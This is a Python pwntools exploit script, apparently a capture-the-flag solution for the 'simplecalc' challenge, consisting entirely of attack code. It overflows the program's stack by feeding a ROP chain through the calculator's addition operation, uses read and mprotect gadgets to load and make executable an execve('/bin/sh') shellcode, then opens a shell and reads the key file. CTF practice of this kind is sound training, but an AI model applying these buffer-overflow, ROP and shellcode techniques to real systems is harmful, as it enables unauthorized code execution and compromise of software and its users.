pop_rdi = 0x0000000000401b73 
pop_rsi = 0x0000000000401c87 
pop_rcx = 0x00000000004b8f17
pop_rdx = 0x0000000000437a85 
_read = 0x434B20
_write = 0x0434B80  
_mprotect = 0x00435690
sc_addr = 0x6c3000
main = 0x401383 
i = 0
from pwn import *
#p = process('./pwn')
p = remote('simplecalc.bostonkey.party', 5400)
p.recvuntil(':')
p.sendline('255')
payload  = 'a'*0x30
payload += p64(0)
payload += 'a'*8
payload += 'b'*8
payload += p64(pop_rdi)
payload += p64(0)
payload += p64(pop_rsi)
payload += p64(sc_addr)
payload += p64(pop_rdx)
payload += p64(0x7ffffff)
payload += p64(_read)
payload += p64(main)
payload += p64(main)
payload += p64(main)
for i in range( len(payload)/4 ):
	tmp = int( payload[4*i: 4+4*i][::-1].encode('hex'), 16)
	x = tmp / 2
	y = tmp / 2 + tmp % 2
	if x<39:
		x = x+40
		y = y-40
	assert(abs(x)>39 and abs(y)>39)
	p.recvuntil('=>')
	p.sendline('1')
	p.recvuntil(':')
	p.sendline(str(x))
	p.recvuntil(':')
	p.sendline(str(y))
	print 'sending payload',i
	i += 1
p.sendline('5')
p.sendline("\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05")
p.recvuntil(':')
p.sendline('255')
payload  = 'a'*0x30
payload += p64(0)
payload += 'a'*8
payload += 'b'*8
payload += p64(pop_rdi)
payload += p64(sc_addr)
payload += p64(pop_rsi)
payload += p64(0x3000)
payload += p64(pop_rdx)
payload += p64(7)
payload += p64(_mprotect)
payload += p64(sc_addr)
payload += p64(sc_addr)
payload += p64(sc_addr)
payload += p64(sc_addr)
payload += p64(sc_addr)
payload += p64(sc_addr)
payload += p64(sc_addr)
for i in range( len(payload)/4 ):
	tmp = int( payload[4*i: 4+4*i][::-1].encode('hex'), 16)
	x = tmp / 2
	y = tmp / 2 + tmp % 2
	if x<39:
		x = x+80
		y = y-80
	assert(abs(x)>39 and abs(y)>39)
	p.recvuntil('=>')
	p.sendline('1')
	p.recvuntil(':')
	p.sendline(str(x))
	p.recvuntil(':')
	p.sendline(str(y))
	print 'sending payload', i
	i += 1
p.sendline('5')
p.sendline('cat key')
p.sendline('cat key')
p.interactive()

